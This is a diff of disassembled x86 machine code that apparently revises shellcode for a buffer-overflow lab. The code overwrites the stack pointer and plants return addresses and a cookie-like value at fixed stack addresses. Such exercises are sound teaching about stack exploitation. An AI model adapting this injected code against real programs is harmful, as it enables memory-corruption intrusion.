@@ -8,9 +8,15 @@ Disassembly of section .text:
    0:	b8 37 35 23 19       	mov    $0x19233537,%eax
    5:	bb d1 8d 04 08       	mov    $0x8048dd1,%ebx
    a:	89 1d 44 2f 68 55    	mov    %ebx,0x55682f44
-  10:	bb 01 00 00 00       	mov    $0x1,%ebx
-  15:	ba ef be ad de       	mov    $0xdeadbeef,%edx
-  1a:	89 15 64 2f 68 55    	mov    %edx,0x55682f64
-  20:	90                   	nop
-  21:	bc 44 2f 68 55       	mov    $0x55682f44,%esp
-  26:	c3                   	ret    
+  10:	89 e3                	mov    %esp,%ebx
+  12:	bb 01 00 00 00       	mov    $0x1,%ebx
+  17:	ba ef be ad de       	mov    $0xdeadbeef,%edx
+  1c:	89 15 64 2f 68 55    	mov    %edx,0x55682f64
+  22:	bc 44 2f 68 55       	mov    $0x55682f44,%esp
+  27:	c7 05 74 2f 68 55 1d 	movl   $0x8048f1d,0x55682f74
+  2e:	8f 04 08 
+  31:	c7 05 48 2f 68 55 00 	movl   $0xf7fe8200,0x55682f48
+  38:	82 fe f7 
+  3b:	c7 05 70 2f 68 55 f0 	movl   $0x55685ff0,0x55682f70
+  42:	5f 68 55 
+  45:	c3                   	ret    
